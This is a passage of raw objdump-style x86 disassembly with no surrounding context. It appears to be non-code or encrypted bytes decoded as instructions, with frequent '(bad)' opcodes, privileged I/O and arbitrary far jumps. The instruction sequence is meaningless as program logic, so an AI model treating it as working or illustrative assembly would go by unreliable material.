  411364:	je     0x41132d
  411366:	pop    eax
  411367:	pop    ds
  411368:	or     eax,0xd96819d5
  41136d:	std    
  41136e:	push   ecx
  41136f:	xchg   DWORD PTR [ecx-0x5a83b61b],edx
  411375:	inc    esi
  411376:	fs mov bl,0x80
  411379:	mov    dl,0x4d
  41137b:	cdq    
  41137c:	loop   0x4113c0
  41137e:	mov    BYTE PTR [esi+ebp*2+0x3e],ah
  411382:	ret    0xdf26
  411385:	sahf   
  411386:	(bad)  
  411387:	out    dx,al
  411388:	ret    
  411389:	in     al,dx
  41138a:	hlt    
  41138b:	cdq    
  41138c:	test   al,0x12
  41138e:	push   edx
  41138f:	push   ds
  411390:	(bad)  
  411391:	std    
  411392:	push   ss
  411393:	adc    BYTE PTR [edi-0x672bde5c],dl
  411399:	xchg   esp,eax
  41139a:	xor    edx,DWORD PTR [edi-0x14]
  41139d:	leave  
  41139e:	mov    ds:0x7c679aca,al
  4113a4:	int    0xd0
  4113a6:	or     DWORD PTR [esi-0x3d5ba160],ebx
  4113ac:	sub    DWORD PTR [edi],ebx
  4113ae:	xchg   edi,edi
  4113b0:	and    DWORD PTR ds:0xaeda005c,ebx
  4113b6:	or     esi,0x24
  4113b9:	inc    edi
  4113ba:	rol    DWORD PTR [esi-0x69c11546],1
  4113c0:	jnp    0x41138a
  4113c2:	jns    0x41138a
  4113c4:	and    DWORD PTR [ebx-0x38554b14],ebx
  4113ca:	fmul   QWORD PTR ds:0x77a4eaab
  4113d0:	dec    eax
  4113d1:	and    ebp,esp
  4113d3:	jae    0x4113c1
  4113d5:	pop    ds
  4113d6:	cdq    
  4113d7:	jle    0x411377
  4113d9:	inc    ebp
  4113da:	(bad)  
  4113dc:	aaa    
  4113dd:	pop    ss
  4113de:	ficomp WORD PTR [edi-0x3b]
  4113e1:	inc    ecx
  4113e2:	cs mov ebx,0xfe7c84c1
  4113e8:	aad    0xfb
  4113ea:	in     eax,0x84
  4113ec:	sbb    eax,0x4c71420c
  4113f1:	xchg   esp,eax
  4113f2:	inc    ebp
  4113f3:	scas   eax,DWORD PTR es:[edi]
  4113f4:	pusha  
  4113f5:	pop    es
  4113f6:	shr    DWORD PTR [edi+0x441562c2],1
  4113fc:	bound  eax,QWORD PTR [ebp+0x56]
  4113ff:	fbld   TBYTE PTR [esi+0x54]
  411402:	fidiv  DWORD PTR [eax]
  411404:	mov    edx,0x72648804
  411409:	das    
  41140a:	bound  esp,QWORD PTR [ebx+0x3e]
  41140d:	jge    0x411421
  41140f:	push   cs
  411410:	mov    al,ds:0xeec7fa16
  411415:	outs   dx,BYTE PTR ds:[esi]
  411416:	sbb    ah,ch
  411418:	mov    cl,0x9d
  41141a:	push   ds
  41141b:	enter  0x478b,0xd3
  41141f:	mov    dh,0x2
  411421:	(bad)  
  411422:	pop    ds
  411423:	xchg   BYTE PTR [ecx-0x2e979159],al
  411429:	sbb    DWORD PTR [ecx-0x2d7fc354],esp
  41142f:	lock fwait
  411431:	test   eax,0x2dfb0ab8
  411436:	inc    esp
  411437:	sbb    al,0x8b
  411439:	out    0x87,eax
  41143b:	sub    DWORD PTR [ecx],0xdc77ad3d
  411441:	sbb    DWORD PTR [edi-0x54],esp
  411444:	in     al,dx
  411445:	dec    ebx
  411446:	push   esp
  411447:	fwait
  411448:	push   ds
  411449:	call   0xd05aa39e
  41144e:	mov    esi,0x7133691e
  411453:	sub    DWORD PTR [ebx],ecx
  411455:	and    DWORD PTR [ebx-0x5565b8b],0xfffffffc
  41145c:	or     ch,cl
  41145e:	push   ebp
  41145f:	int    0x56
  411461:	stc    
  411462:	fdivp  st(0),st
  411464:	jg     0x4114b2
  411466:	push   cs
  411467:	jg     0x41141c
  411469:	test   dl,ah
  41146b:	xchg   edi,eax
  41146c:	mov    edx,0xaf74063f
  411471:	dec    ebx
  411472:	dec    esp
  411473:	jge    0x411495
  411475:	mov    bl,0xea
  411477:	mov    esi,0x1f9b4998
  41147c:	sub    eax,0x7a9d2e7
  411481:	mov    al,0xd4
  411483:	push   ecx
  411484:	shl    DWORD PTR [ecx+0x52],cl
  411487:	test   eax,0x78c3f2a3
  41148c:	pop    ds
  41148d:	or     eax,0x30ee2f67
  411492:	retf   
  411493:	fstp   TBYTE PTR [edi]
  411495:	ja     0x41146d
  411497:	clc    
  411498:	rcl    DWORD PTR [edi],0x4b
  41149b:	sub    eax,0x1a73efd4
  4114a0:	lahf   
  4114a1:	dec    esi
  4114a2:	mov    ebp,ecx
  4114a4:	inc    ebx
  4114a5:	mov    fs:0x3477b220,eax
  4114ab:	jmp    0x411524
  4114ad:	adc    BYTE PTR [edx+0x603bb6a1],dh
  4114b3:	push   eax
  4114b4:	pusha  
  4114b5:	push   ecx
  4114b6:	push   eax
  4114b7:	rcr    BYTE PTR [edx-0x8],0xd0
  4114bb:	mov    esp,0x92edbe78
  4114c0:	sub    esi,DWORD PTR [eax]
  4114c2:	mov    edx,0x802c49c7
  4114c7:	xchg   esi,eax
  4114c8:	adc    esp,esi
  4114ca:	fmulp  st(6),st
  4114cc:	add    DWORD PTR ds:0xf4079969,eax
  4114d2:	inc    edi
  4114d3:	daa    
  4114d4:	sub    BYTE PTR [ebx],dl
  4114d6:	bound  eax,QWORD PTR [edi-0x340a96d1]
  4114dc:	shr    BYTE PTR [eax-0x41],1
  4114df:	push   ebx
  4114e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114e1:	cmp    cl,BYTE PTR [esi-0x57e9f89a]
  4114e7:	mov    dh,0xf
  4114e9:	ret    
  4114ea:	ffree  st(2)
  4114ec:	mov    ah,0x8a
  4114ee:	lea    ecx,[edx+0xb09eadc]
  4114f4:	adc    eax,0x8c17da7c
  4114f9:	fstp   QWORD PTR [ecx-0x41a27f5]
  4114ff:	inc    edi
  411500:	mov    ecx,0xa9babcd3
  411505:	ins    DWORD PTR es:[edi],dx
  411506:	push   0x86f5fa8a
  41150b:	push   ss
  41150c:	imul   esp,DWORD PTR [ecx+0x1789b0f2],0x4
  411513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411514:	mov    bl,0x31
  411516:	xchg   ebx,eax
  411517:	out    0xe9,eax
  411519:	pop    ebp
  41151a:	leave  
  41151b:	xor    BYTE PTR [ecx+ebx*1],0xc6
  41151f:	sub    bh,BYTE PTR [eax-0x1c32796a]
  411525:	test   eax,0x21b1ef71
  41152a:	and    edx,edi
  41152c:	sbb    BYTE PTR [ecx],dh
  41152e:	movaps xmm0,xmm2
  411531:	jno    0x411562
  411533:	or     al,0xe0
  411535:	leave  
  411536:	mov    dh,0xa2
  411538:	jmp    0x5b7b:0x66784bc2
  41153f:	sbb    edi,DWORD PTR [eax+edx*2]
  411542:	jmp    0x9ab377a0
  411547:	mov    bl,0x96
  411549:	sar    DWORD PTR [ebx],cl
  41154b:	mov    edx,DWORD PTR [ebx+0x15]
  41154e:	xor    bh,dh
  411550:	push   eax
  411551:	rep lods al,BYTE PTR ds:[esi]
  411553:	cli    
  411554:	and    al,0xfe
  411556:	adc    al,0x8
  411558:	or     DWORD PTR [edi],esi
  41155a:	mov    ebx,0xfd4b9847
  41155f:	leave  
  411560:	xor    BYTE PTR [ebx-0x4d],dl
  411563:	retf   
  411564:	mov    eax,ds:0xd06b7478
  411569:	sub    DWORD PTR [ebp+0x3a],ebx
  41156c:	pop    ebp
  41156d:	inc    eax
  41156e:	test   DWORD PTR [ebp+0x710fa4d8],eax
  411574:	mov    edi,0x9c562fe5
  411579:	cli    
  41157a:	push   ds
  41157b:	mov    ds:0xa35a737f,eax
  411580:	push   cs
  411581:	inc    esp
  411582:	mov    DWORD PTR [esi],edi
  411584:	push   ebp
  411585:	test   DWORD PTR [ebx+edi*4+0x52],esp
  411589:	(bad)  
  41158a:	jge    0x41159b
  41158c:	mov    ebx,0x4408ce19
  411591:	jmp    0x648a:0x515238f1
  411598:	xchg   DWORD PTR [ebp+0x591e13cc],ebx
  41159e:	xlat   BYTE PTR ds:[ebx]
  41159f:	stos   DWORD PTR es:[edi],eax
  4115a0:	(bad)  
  4115a3:	push   ebp
  4115a4:	lds    esp,FWORD PTR [eax-0x61]
  4115a7:	xlat   BYTE PTR ds:[ebx]
  4115a8:	sbb    ecx,esi
  4115aa:	fcmovnu st,st(0)
  4115ac:	fld    TBYTE PTR [eiz*4+0x328a1f40]
  4115b3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4115b5:	jns    0x41156c
  4115b7:	lods   eax,DWORD PTR ds:[esi]
  4115b8:	sahf   
  4115b9:	jne    0x4115e4
  4115bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115bd:	mov    DWORD PTR [esi-0x7689e32a],edx
  4115c3:	sahf   
  4115c4:	or     ebp,ebx
  4115c6:	xor    esp,esp
  4115c8:	mov    eax,0x3302fc0f
  4115cd:	jns    0x4115ea
  4115cf:	in     eax,0x63
  4115d1:	iret   
  4115d2:	jne    0x411608
  4115d4:	mov    gs,WORD PTR [eax]
  4115d6:	stc    
  4115d7:	lock xlat BYTE PTR ds:[ebx]
  4115d9:	shr    esp,1
  4115db:	and    al,0x8f
  4115dd:	in     al,dx
  4115de:	cli    
  4115df:	push   ecx
  4115e0:	ins    DWORD PTR es:[edi],dx
  4115e1:	test   BYTE PTR [eax],ch
  4115e3:	sbb    BYTE PTR [ecx+0x3db0249f],0x7c
  4115ea:	mul    BYTE PTR [eax+edx*2]
  4115ed:	mov    DWORD PTR [ebp+0x33],eax
  4115f0:	dec    esp
  4115f1:	scas   al,BYTE PTR es:[edi]
  4115f2:	jnp    0x411598
  4115f4:	push   esi
  4115f5:	test   esi,esi
  4115f7:	jnp    0x4115f3
  4115f9:	sub    ah,bh
  4115fb:	inc    eax
  4115fc:	push   edi
  4115fd:	jo     0x4115d6
  4115ff:	xor    ebx,eax
  411601:	scas   eax,DWORD PTR es:[edi]
  411602:	pop    es
  411603:	mov    al,ds:0x54fa7212
  411608:	jne    0x4115da
  41160a:	nop
  41160b:	mov    DWORD PTR [ecx],edi
  41160d:	jne    0x411590
  41160f:	ss pop edi
  411611:	fs pop ecx
  411613:	fcmovu st,st(5)
  411615:	mov    esp,0xd0dea029
  41161a:	pop    ebp
  41161b:	idiv   BYTE PTR [edx-0x4bf117f0]
  411621:	test   eax,0xff2c5c2e
  411626:	adc    BYTE PTR [edi-0x7b0bf7c5],cl
  41162c:	sub    DWORD PTR [ebp+0x1ba80111],eax
  411632:	ret    0x5d5c
  411635:	cmp    dh,BYTE PTR [esi-0x42]
  411638:	jae    0x4115f2
  41163a:	push   ecx
  41163b:	clc    
  41163c:	cmp    BYTE PTR [eax+edx*4-0x3b],0xc9
  411641:	leave  
  411642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411643:	clc    
  411644:	sbb    edi,edi
  411646:	xor    al,0x2
  411648:	sti    
  411649:	fstp   TBYTE PTR [ebx]
  41164b:	daa    
  41164c:	jmp    0x986b:0xdd3b16b9
  411653:	jl     0x411662
  411655:	jge    0x41165b
  411657:	in     eax,0x96
  411659:	push   ebp
  41165a:	and    eax,esi
  41165c:	addr16 cmp dl,0xd1
  411660:	add    eax,0x2af2c518
  411665:	dec    edx
  411666:	inc    ebp
  411667:	or     DWORD PTR [edi+0xb1b124a],ebp
  41166d:	in     eax,0x25
  41166f:	sahf   
  411670:	push   ds
  411671:	call   0xc55d5d9a
  411676:	inc    ebp
  411677:	adc    bl,dh
  411679:	xchg   DWORD PTR [eax-0x4ba93fff],eax
  41167f:	out    0x9a,eax
  411681:	pop    eax
  411682:	lahf   
  411683:	mov    dl,dh
  411685:	in     eax,0x58
  411687:	or     bh,BYTE PTR [esi-0x7c73e566]
  41168d:	pop    ebx
  41168e:	inc    edx
  41168f:	aas    
  411690:	sub    DWORD PTR [eax],eax
  411692:	lock jnp 0x411701
  411695:	mov    eax,?
  411697:	cdq    
  411698:	jmp    0x9ea706c3
  41169d:	stos   DWORD PTR es:[edi],eax
  41169e:	ret    0x70c0
  4116a1:	mov    BYTE PTR [esi+0x6d],dl
  4116a4:	push   0x46
  4116a6:	sbb    BYTE PTR ds:0x2e67716b,ch
  4116ac:	mov    ds:0x2e4f5da3,al
  4116b1:	mov    eax,0x3293b4e0
  4116b6:	bndstx [ebp+ebx*2+0x66],(bad)
  4116bb:	jmp    0xbecd0639
  4116c0:	push   esp
  4116c1:	mov    al,ds:0x21af65bb
  4116c6:	lods   al,BYTE PTR ds:[esi]
  4116c7:	mov    bh,0xa1
  4116c9:	mov    al,0xf3
  4116cb:	xor    al,0x5e
  4116cd:	daa    
  4116ce:	retf   
  4116cf:	mov    eax,0x39e168f
  4116d4:	mov    dh,BYTE PTR [eax-0x61f37961]
  4116da:	adc    edx,DWORD PTR [edi-0x5]
  4116dd:	and    eax,0x1a1de2ad
  4116e2:	lods   eax,DWORD PTR ds:[esi]
  4116e3:	pop    esi
  4116e4:	cld    
  4116e5:	scas   eax,DWORD PTR es:[edi]
  4116e6:	leave  
  4116e7:	and    ebp,DWORD PTR [esi+ebx*2+0x73]
  4116eb:	fnstsw WORD PTR [edi-0x413b479f]
  4116f1:	bnd jp 0x4116a2
  4116f4:	cmovge edi,DWORD PTR [edx*8+0x23edf92e]
  4116fc:	pop    ebp
  4116fd:	pop    edx
  4116fe:	xor    ebx,0xd4bd88f7
  411704:	call   0xb719b34b
  411709:	imul   ebp,DWORD PTR [eax-0x797ef3eb],0x663dc62b
  411713:	in     al,0x83
  411715:	sbb    BYTE PTR [edx],bh
  411717:	ss and edx,eax
  41171a:	nop
  41171b:	fild   DWORD PTR [esi]
  41171d:	push   es
  41171e:	in     eax,0x3d
  411720:	cmc    
  411721:	rol    DWORD PTR cs:[ebx],0x2b
  411725:	pop    ebx
  411726:	daa    
  411727:	pop    ebx
  411728:	inc    ebp
  411729:	jbe    0x41175f
  41172b:	pop    ecx
  41172c:	stos   BYTE PTR es:[edi],al
  41172d:	mov    cl,0x8c
  41172f:	add    al,0x10
  411731:	out    0x5d,eax
  411733:	xlat   BYTE PTR ds:[ebx]
  411734:	dec    eax
  411735:	fdiv   DWORD PTR [eax-0x1294e19b]
  41173b:	mov    ch,0x4f
  41173d:	ja     0x411750
  41173f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411740:	test   BYTE PTR [ebp-0x7d],cl
  411743:	mov    al,0xc4
  411745:	cmp    eax,0xc0425054
  41174a:	jbe    0x411760
  41174c:	xchg   esp,eax
  41174d:	cmp    BYTE PTR ds:0xcc64b772,cl
  411753:	jns    0x41178c
  411755:	lds    edx,FWORD PTR [ecx-0x2493811]
  41175b:	stc    
  41175c:	cmp    ebp,DWORD PTR [ecx+eax*4-0x2d]
  411760:	push   cs
  411761:	cwde   
  411762:	in     al,0x7
  411764:	jp     0x41178e
  411766:	scas   eax,DWORD PTR es:[edi]
  411767:	push   ss
  411768:	dec    esp
  411769:	or     eax,0x8179885a
  41176e:	iret   
  41176f:	adc    BYTE PTR [edx+0x7c],dh
  411772:	fwait
  411773:	dec    ebp
  411774:	test   esi,ebx
  411776:	loopne 0x411795
  411778:	in     eax,0x75
  41177a:	pop    eax
  41177b:	jg     0x41178b
  41177d:	inc    ebp
  41177e:	xchg   edx,eax
  41177f:	stc    
  411780:	push   ebx
  411781:	mov    al,ds:0x2b3e9201
  411786:	arpl   di,ax
  411788:	push   ebx
  411789:	(bad)  
  41178b:	cmp    BYTE PTR [edx-0x2dad44a5],0xde
  411792:	aam    0x73
  411794:	out    0x24,eax
  411796:	(bad)  
  411797:	out    0xc9,al
  411799:	xchg   ebx,eax
  41179a:	cmp    edi,DWORD PTR [edi]
  41179c:	dec    eax
  41179d:	(bad)  
  41179e:	int3   
  41179f:	pop    esp
  4117a0:	aas    
  4117a1:	test   DWORD PTR [ebp+0x3fe1bcd7],ecx
  4117a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a8:	xlat   BYTE PTR ds:[ebx]
  4117a9:	cmc    
  4117aa:	sub    al,0x87
  4117ac:	pop    ss
  4117ad:	push   DWORD PTR [edi+ebx*2]
  4117b0:	add    ebp,DWORD PTR [edx-0x11a804d1]
  4117b6:	jmp    0x411808
  4117b8:	js     0x411742
  4117ba:	sahf   
  4117bb:	dec    ecx
  4117bc:	retf   
  4117bd:	icebp  
  4117be:	div    DWORD PTR [edi+0x46]
  4117c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117c2:	ins    DWORD PTR es:[edi],dx
  4117c3:	(bad)  
  4117c4:	fbld   TBYTE PTR [ecx+eax*8-0x1]
  4117c8:	sbb    ch,BYTE PTR [ebp+eiz*8-0x5de1cb18]
  4117cf:	xchg   ecx,eax
  4117d0:	cwde   
  4117d1:	fisttp WORD PTR es:[edx+ebp*1]
  4117d5:	jl     0x4117f2
  4117d7:	sbb    esi,DWORD PTR [eax-0x26]
  4117da:	mov    ds:0xa7c6f6ed,al
  4117df:	std    
  4117e0:	imul   ebx,eax,0x66d1937a
  4117e6:	or     ch,ch
  4117e8:	shl    ecx,0x48
  4117eb:	lea    eax,[ebp-0x56897748]
  4117f1:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117f3:	les    ebx,FWORD PTR [edi-0x5e]
  4117f6:	mov    esi,0xba6478b8
  4117fb:	stos   DWORD PTR es:[edi],eax
  4117fc:	xchg   edi,eax
  4117fd:	mov    bl,0x7e
  4117ff:	add    ecx,DWORD PTR [esi+0x49c2c175]
  411805:	rol    DWORD PTR [eax+0x62d2b6af],cl
  41180b:	loop   0x41185c
  41180d:	inc    ebx
  41180e:	and    eax,0x29649117
  411813:	(bad)  
  411814:	int    0xb3
  411816:	ja     0x4117b7
  411818:	lahf   
  411819:	push   0xffffffbf
  41181b:	out    dx,eax
  41181c:	dec    esi
  41181d:	mov    ds:0x1cfb3b1d,al
  411822:	pusha  
  411823:	loop   0x41186e
  411825:	mov    al,ds:0x64d92b91
  41182a:	(bad)  
  41182b:	js     0x411803
  41182d:	fs int 0x80
  411830:	cmp    BYTE PTR [edi],0x50
  411833:	imul   edx,DWORD PTR [ebx+edx*8-0x29c7594a],0xc1c13d87
  41183e:	stos   DWORD PTR es:[edi],eax
  41183f:	test   al,0x29
  411841:	xor    eax,DWORD PTR ds:0x3dc4ab0f
  411847:	daa    
  411848:	call   0x82a7:0x90aceb3d
  41184f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411850:	pop    ss
  411851:	retf   
  411852:	inc    eax
  411853:	ins    BYTE PTR es:[edi],dx
  411854:	and    eax,0xa979921c
  411859:	pushf  
  41185a:	jnp    0x41180e
  41185c:	xor    DWORD PTR [edi+ebx*2-0x15d07835],edi
  411863:	cmp    ecx,ebx
  411865:	mov    eax,0x29134d79
  41186a:	test   bl,ah
  41186c:	pop    ebx
  41186d:	pop    edi
  41186e:	push   eax
  41186f:	dec    ecx
  411870:	in     eax,0xd
  411872:	mov    ecx,0xf0c2be9d
  411877:	sub    al,0xcd
  411879:	push   ebp
  41187a:	mov    ds,WORD PTR [esi+edi*8]
  41187d:	mov    bl,0x68
  41187f:	pop    edx
  411880:	dec    ebx
  411881:	sahf   
  411882:	bound  ebp,QWORD PTR [edx+0x42]
  411885:	popa   
  411886:	add    bh,BYTE PTR [edi+0x73e68be7]
  41188c:	sbb    dh,BYTE PTR [eax]
  41188e:	pop    esp
  41188f:	lods   eax,DWORD PTR ds:[esi]
  411890:	mov    dl,BYTE PTR [edx]
  411892:	or     DWORD PTR [eax-0x44],0x3a
  411896:	xchg   BYTE PTR [edx+0x6f],bl
  411899:	add    ah,bh
  41189b:	adc    al,BYTE PTR [ebp-0x18082f87]
  4118a1:	imul   BYTE PTR [ebx]
  4118a3:	loope  0x4118ea
  4118a5:	mov    dl,0x6a
  4118a7:	xchg   edi,eax
  4118a8:	add    BYTE PTR [ecx],ch
  4118aa:	lea    ebx,[eax]
  4118ac:	mov    ebx,0xefcd0707
  4118b1:	jge    0x4118f4
  4118b3:	xor    BYTE PTR [ecx-0x4f],cl
  4118b6:	jmp    0x411933
  4118b8:	push   ebx
  4118b9:	or     al,0x68
  4118bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118bc:	xchg   ebx,eax
  4118bd:	pusha  
  4118be:	(bad)
  4118c1:	push   esi
  4118c2:	and    al,ah
  4118c4:	sub    ah,BYTE PTR [esi]
  4118c6:	dec    esp
  4118c7:	call   0xc0:0xa563b7b3
  4118ce:	and    bh,ch
  4118d0:	dec    edi
  4118d1:	ret    
  4118d2:	sbb    esp,esp
  4118d4:	inc    esp
  4118d5:	data16 stos BYTE PTR es:[edi],al
  4118d7:	sbb    bh,dl
  4118d9:	push   eax
  4118da:	mov    ds:0x9a6bf5b6,al
  4118df:	inc    ebx
  4118e0:	repz out dx,al
  4118e2:	mov    cl,0x63
  4118e4:	cmp    al,0xf3
  4118e6:	mov    ecx,0xd91560f
  4118eb:	pop    eax
  4118ec:	sub    eax,0x161b528d
  4118f1:	gs pusha 
  4118f3:	jns    0x411907
  4118f5:	push   edi
  4118f6:	inc    edx
  4118f7:	sbb    al,0x37
  4118f9:	fs mov edi,0x684579cb
  4118ff:	leave  
  411900:	lods   eax,DWORD PTR ds:[si]
  411902:	stos   DWORD PTR es:[edi],eax
  411903:	mul    DWORD PTR [edi+0x3f]
  411906:	arpl   cx,bx
  411908:	jo     0x41194f
  41190a:	bound  ebp,QWORD PTR [esi+0x2b]
  41190d:	popf   
  41190e:	cmp    edi,0xe84786df
  411914:	retf   0x6c3e
  411917:	pop    ds
  411918:	jecxz  0x411964
  41191a:	test   eax,0x1f25e5fc
  41191f:	cdq    
  411920:	jnp    0x411911
  411922:	fsub   st(2),st
  411924:	sbb    DWORD PTR [edi+edi*2+0x1cd8217b],edx
  41192b:	pop    ebx
  41192c:	mov    bl,0xf1
  41192e:	push   cs
  41192f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  411931:	sub    DWORD PTR [eax+0x24],edi
  411934:	xor    esp,0x4d807bb
  41193a:	inc    eax
  41193b:	fldenv [ebx]
  41193d:	push   es
  41193e:	sbb    esi,ebp
  411940:	addr16 (bad) 
  411942:	in     al,dx
  411943:	lds    ebp,FWORD PTR [bx-0xc]
  411947:	mov    esp,0x1698d77
  41194c:	and    eax,0x36abb763
  411951:	add    BYTE PTR es:[esi],ah
  411954:	mov    ebx,ebx
  411956:	add    eax,0xf755edd1
  41195b:	(bad)  
  41195c:	cdq    
  41195d:	push   esp
  41195e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41195f:	mov    dl,BYTE PTR [edx+0x7d36e3df]
  411965:	or     al,dl
  411967:	mov    al,0x78
  411969:	cmp    eax,0x9bf56087
  41196e:	(bad)  
  411970:	push   edi
  411971:	sub    BYTE PTR [eax-0x71],ah
  411974:	lods   eax,DWORD PTR ds:[esi]
  411975:	mov    eax,ds:0x3d32936f
  41197a:	mov    BYTE PTR [ebx-0x2e6c3ec3],dh
  411980:	lods   al,BYTE PTR ds:[esi]
  411981:	add    DWORD PTR [edi],esp
  411983:	dec    esi
  411984:	std    
  411985:	ins    DWORD PTR es:[edi],dx
  411986:	cld    
  411987:	mov    es,eax
  411989:	test   DWORD PTR [edi+0x5a],ebp
  41198c:	pushf  
  41198d:	xchg   ebp,eax
  41198e:	push   eax
  41198f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411990:	sbb    al,0x50
  411992:	adc    esp,edi
  411994:	mov    BYTE PTR [eax+0x75],ch
  411997:	mov    ds:0xc9452f0c,al
  41199c:	mov    bh,0xcd
  41199e:	mov    ah,0xde
  4119a0:	xchg   DWORD PTR [edx+0x11],ecx
  4119a3:	mov    al,0x83
  4119a5:	dec    esi
  4119a6:	xor    al,0xa9
  4119a8:	mov    DWORD PTR [ebx+esi*1-0x21],edi
  4119ac:	iret   
  4119ad:	mov    dh,0xa3
  4119af:	adc    DWORD PTR [edx],ebp
  4119b1:	xor    BYTE PTR [ecx],bh
  4119b3:	cmp    ebx,DWORD PTR [ecx+ebp*1+0x77cca91e]
  4119ba:	or     al,0x11
  4119bc:	sbb    DWORD PTR [esi+eiz*2],esp
  4119bf:	xor    edx,edi
  4119c1:	cmc    
  4119c2:	ror    BYTE PTR [ebx-0x67],cl
  4119c5:	lea    edi,[esp+0x23]
  4119c9:	mov    ah,BYTE PTR [edx-0x2f]
  4119cc:	sahf   
  4119cd:	mov    esi,0xff890228
  4119d2:	rol    DWORD PTR ds:0xa313455b,1
  4119d8:	sbb    dh,dl
  4119da:	cmp    bl,BYTE PTR [ecx+0x35]
  4119dd:	outs   dx,DWORD PTR ds:[esi]
  4119df:	mov    ss,WORD PTR [ecx-0x1f]
  4119e2:	fsubr  QWORD PTR [edi+0x3a]
  4119e5:	sbb    ebp,edx
  4119e7:	lahf   
  4119e8:	cdq    
  4119e9:	push   es
  4119ea:	mov    eax,0x3fa43fc2
  4119ef:	and    DWORD PTR [eax-0x52],0x59d72630
  4119f6:	dec    ebp
  4119f7:	pop    es
  4119f8:	cmp    ebp,DWORD PTR [eax]
  4119fa:	test   al,0xc8
  4119fc:	outs   dx,BYTE PTR ds:[esi]
  4119fd:	popf   
  4119fe:	stos   DWORD PTR es:[edi],eax
  4119ff:	push   eax
  411a00:	sub    eax,0xdb5abd2d
  411a05:	jnp    0xd265e7b1
  411a0b:	xchg   BYTE PTR [edx-0x39],ch
  411a0e:	sbb    BYTE PTR [ebp+0x5aa0bbb6],0xb4
  411a15:	call   FWORD PTR [ecx-0x73]
  411a18:	sbb    eax,0xfe26fd30
  411a1d:	mov    dh,0xe
  411a1f:	add    eax,0x2f90126f
  411a24:	test   eax,0x7cb5f464
  411a29:	add    BYTE PTR [eax],dl
  411a2b:	int    0xd4
  411a2d:	push   0x35
  411a2f:	sub    BYTE PTR [esi],bl
  411a31:	inc    ebp
  411a32:	rol    edi,1
  411a34:	jge    0x411a3c
  411a36:	repz sbb al,0x3a
  411a39:	test   eax,0xb3f11c4d
  411a3e:	push   ebp
  411a3f:	into   
  411a40:	push   ecx
  411a41:	repnz mov eax,ds:0xa68444f8
  411a47:	fidivr DWORD PTR [ecx+ecx*2+0x73]
  411a4b:	jl     0x411a04
  411a4d:	pop    ebx
  411a4e:	adc    BYTE PTR [ecx+0x11],bl
  411a51:	mov    ebp,0x6be5110c
  411a56:	xor    eax,0xdb0f897d
  411a5b:	jle    0x411a97
  411a5d:	push   ds
  411a5e:	ds xchg edx,eax
  411a60:	loope  0x411a7f
  411a62:	cs sbb al,0x91
  411a65:	lds    edi,FWORD PTR [ebp-0x42ccec37]
  411a6b:	loopne 0x411a9f
  411a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6e:	out    0x26,eax
  411a70:	jl     0x411abf
  411a72:	or     al,0xb5
  411a74:	sbb    BYTE PTR [ebx-0x310305e8],ch
  411a7a:	imul   ecx,DWORD PTR [ebx-0x100b88c9],0xe057885f
  411a84:	mov    ch,0xdc
  411a86:	loopne 0x411a88
  411a88:	xor    ebx,DWORD PTR ds:0x49ab99c8
  411a8e:	(bad)  
  411a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a91:	dec    ebp
  411a92:	mov    eax,ds:0xf7b33bfd
  411a97:	xor    BYTE PTR [ecx],cl
  411a99:	push   0x799c5816
  411a9e:	pop    edi
  411a9f:	shr    BYTE PTR [ecx-0x77],0x80
  411aa3:	add    ecx,eax
  411aa5:	push   edi
  411aa6:	xor    BYTE PTR [ebx],bl
  411aa8:	retf   
  411aa9:	jl     0x411aa3
  411aab:	jmp    0x411a8c
  411aad:	xor    eax,0x2a2abe24
  411ab2:	fiadd  WORD PTR [ebx-0x3e7f4a9b]
  411ab8:	or     BYTE PTR [ecx+edx*4+0x34],ah
  411abc:	lods   al,BYTE PTR ds:[esi]
  411abd:	or     BYTE PTR [ebp-0x774c03f1],0x3c
  411ac4:	scas   eax,DWORD PTR es:[edi]
  411ac5:	aas    
  411ac6:	arpl   WORD PTR cs:[ebx],cx
  411ac9:	fisttp WORD PTR [ebx-0x36]
  411acc:	ds cmp edi,edx
  411acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad1:	mov    cl,0x70
  411ad3:	inc    esp
  411ad4:	push   es
  411ad5:	inc    esp
  411ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad7:	repnz mov bh,0xd
  411ada:	inc    esp
  411adb:	push   ds
  411adc:	or     DWORD PTR [eax+0x54e90b66],ecx
  411ae2:	or     eax,DWORD PTR [edx-0x49d0891f]
  411ae8:	in     al,0xca
  411aea:	and    eax,0x5655b170
  411aef:	aad    0xa1
  411af1:	xchg   ebx,eax
  411af2:	push   edi
  411af3:	pop    ebp
  411af4:	paddb  mm3,QWORD PTR [ecx]
  411af7:	push   eax
  411af8:	outs   dx,BYTE PTR ds:[esi]
  411af9:	xor    ch,BYTE PTR [edx]
  411afb:	rol    BYTE PTR [edx+0x1aa5e992],cl
  411b01:	(bad)  
  411b03:	pop    eax
  411b04:	mov    ebx,DWORD PTR [esi]
  411b06:	fsubp  st(5),st
  411b08:	aaa    
  411b09:	cmp    esp,ecx
  411b0b:	pop    ds
  411b0c:	sub    ebp,edi
  411b0e:	ins    DWORD PTR es:[edi],dx
  411b0f:	jle    0x411b21
  411b11:	xlat   BYTE PTR ds:[ebx]
  411b12:	mov    ds:0x788bb357,al
  411b17:	test   BYTE PTR [ecx-0x78],cl
  411b1a:	sub    al,0x71
